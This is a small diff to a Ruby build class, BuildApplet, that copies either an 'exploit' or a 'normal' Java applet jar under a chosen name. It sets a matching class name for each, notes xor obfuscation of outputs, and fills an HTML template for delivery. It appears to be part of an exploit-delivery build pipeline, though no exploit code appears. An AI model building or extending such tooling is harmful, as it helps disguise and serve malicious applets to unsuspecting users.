@@ -63,11 +63,13 @@ class BuildApplet < Build
     if File.exists?(path('x.jar'))
       FileUtils.cp path('x.jar'), path(@appname + '.jar')
       @app_type = :exploit
+      classname = "x.XAppletW"
     end
     
     if File.exists?(path('w.jar'))
       FileUtils.cp path('w.jar'), path(@appname + '.jar') 
       @app_type = :normal
+      classname = "Html5"
     end
 
     #obfuscate output_* with xor 0xff 
@@ -80,6 +82,7 @@ class BuildApplet < Build
     # prepare the html file
     index_content = File.open(path('applet.html'), 'rb') {|f| f.read}
     index_content.gsub!('[:APPNAME:]', @appname)
+    index_content.gsub!('[:CLASSNAME:]', classname)
     File.open(path(@appname + '.html'), 'wb') {|f| f.write index_content}
 
     @outputs = [@appname + '.jar', @appname + '.html']
